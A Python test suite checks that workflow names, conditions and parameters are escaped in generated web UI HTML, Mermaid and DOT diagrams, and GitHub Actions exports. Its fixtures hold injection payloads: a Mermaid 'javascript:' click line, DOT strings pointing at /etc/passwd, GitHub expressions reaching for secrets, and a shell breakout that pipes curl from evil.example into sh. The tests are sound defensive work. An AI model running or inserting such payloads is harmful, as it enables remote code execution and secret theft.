"""Tests that untrusted workflow text cannot change generated HTML, diagrams or CI files."""

import re

import yaml

from autoops_architect.api.app import get_ui_html
from autoops_architect.export.formats import ExportFormat, WorkflowExporter
from autoops_architect.models.workflow import Edge, Node, NodeType, WorkflowGraph

# Interpolations in HTML strings that are not derived from workflow data.
TRUSTED_INTERPOLATIONS = {
    "className",
    "node.requires_human_approval ? '<span class=\"approval-badge\">Approval</span>' : ''",
}


def html_interpolations() -> list[str]:
    """Return each ${...} expression inside an innerHTML assignment of the UI."""
    statements = re.findall(r"\.innerHTML\s*\+?=\s*(.+?);\n", get_ui_html(), flags=re.DOTALL)
    assert statements, "expected the UI to build some HTML"
    return [expr for stmt in statements for expr in re.findall(r"\$\{([^{}]+)\}", stmt)]


def workflow_with(name: str, condition: str | None = None) -> WorkflowGraph:
    return WorkflowGraph(
        id="wf-escape",
        name="Escaping",
        goal_description="Goal",
        nodes=[
            Node(id="a", name=name, type=NodeType.ANALYSIS, tool="echo"),
            Node(id="b", name="B", type=NodeType.SUMMARY, tool="summary"),
        ],
        edges=[Edge(from_node_id="a", to_node_id="b", condition=condition)],
    )


class TestWebUi:
    def test_every_html_interpolation_is_escaped(self) -> None:
        unescaped = [
            expr
            for expr in html_interpolations()
            if not expr.startswith("esc(") and expr not in TRUSTED_INTERPOLATIONS
        ]

        assert unescaped == []

    def test_escape_helper_covers_html_metacharacters(self) -> None:
        ui = get_ui_html()

        for char in ("&", "<", ">", '"', "'"):
            assert re.search(rf"'?{re.escape(char)}'?\s*:\s*'&", ui) or f'"{char}"' in ui
        assert "function esc(value)" in ui

    def test_mermaid_source_is_not_parsed_as_html(self) -> None:
        ui = get_ui_html()

        assert "${workflow.mermaid_diagram}" not in ui
        assert "diagram.textContent = workflow.mermaid_diagram" in ui


class TestMermaid:
    def test_line_break_cannot_add_a_statement(self) -> None:
        diagram = workflow_with('x"]\nclick a href "javascript:alert(1)"').to_mermaid()

        assert not any(line.lstrip().startswith("click") for line in diagram.splitlines())
        assert 'a["x#quot;] click a href #quot;javascript:alert(1)#quot;"]' in diagram

    def test_condition_is_quoted(self) -> None:
        diagram = workflow_with("A", condition="{{ count > 5 }}").to_mermaid()

        assert '-->|"{{ count > 5 }}"|' in diagram


class TestDot:
    def test_trailing_backslash_cannot_close_the_string(self) -> None:
        dot = workflow_with('x\\" URL="file:///etc/passwd').to_dot()

        assert 'x\\\\\\" URL=\\"file:///etc/passwd' in dot

    def test_line_break_cannot_add_a_statement(self) -> None:
        dot = workflow_with('x\n"evil" [image="/etc/passwd"];').to_dot()

        assert not any(line.lstrip().startswith('"evil"') for line in dot.splitlines())


class TestGitHubActionsExport:
    def export(self, **node_fields: object) -> dict[str, object]:
        workflow = WorkflowGraph(
            id="wf-gha",
            name="Name ${{ secrets.NAME }}",
            goal_description="Goal ${{ secrets.TOKEN }}",
            nodes=[Node(id="a", name="A", type=NodeType.ANALYSIS, tool="echo", **node_fields)],
        )
        exported = WorkflowExporter(workflow).export(ExportFormat.GITHUB_ACTIONS)
        return dict(yaml.safe_load(exported))

    def test_params_cannot_break_out_of_the_shell_command(self) -> None:
        payload = "'; curl https://evil.example | sh #"

        document = self.export(params={"q": payload})

        step = document["jobs"]["a"]["steps"][-1]  # type: ignore[index]
        assert payload not in step["run"]
        assert payload in step["env"]["NODE_PARAMS"]

    def test_goal_text_is_not_evaluated_as_an_expression(self) -> None:
        document = self.export()

        goal = document["env"]["GOAL"]  # type: ignore[index]
        assert goal == "Goal ${{ '${{' }} secrets.TOKEN }}"
